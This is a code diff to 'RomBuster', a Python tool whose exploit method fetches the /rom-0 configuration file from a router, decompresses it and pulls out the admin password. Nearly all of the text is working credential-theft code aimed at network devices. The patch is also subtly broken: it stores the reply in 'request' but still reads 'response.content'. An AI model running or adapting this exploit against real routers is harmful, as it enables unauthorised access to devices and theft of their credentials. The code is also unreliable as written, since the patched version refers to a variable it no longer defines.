@@ -34,21 +34,28 @@ class RomBuster:
     @staticmethod
     def exploit(address):
         try:
-            response = requests.get(
-                f"http://{address}/rom-0",
-                verify=False,
-                stream=True,
-                timeout=3
-            )
+            content = b''
+            while not content:
+                request = requests.get(
+                    f"http://{address}/rom-0",
+                    verify=False,
+                    timeout=3
+                )
+                
+                if request.status_code == 200:
+                    content = response.content
+                else:
+                    return None
         except Exception:
             return None
 
         username = 'admin'
-        if response.status_code == 200:
-            if 1:
-                data = response.content[8568:]
-                result, window = LZSDecompress(data, RingList(2048))
+        try:
+            data = response.content[8568:]
+            result, window = LZSDecompress(data, RingList(2048))
+        except Exception:
+            return None
 
-            password = re.findall("([\040-\176]{5,})", result)
-            if len(password):
-                return username, password[0]
+        password = re.findall("([\040-\176]{5,})", result)
+        if len(password):
+            return username, password[0]
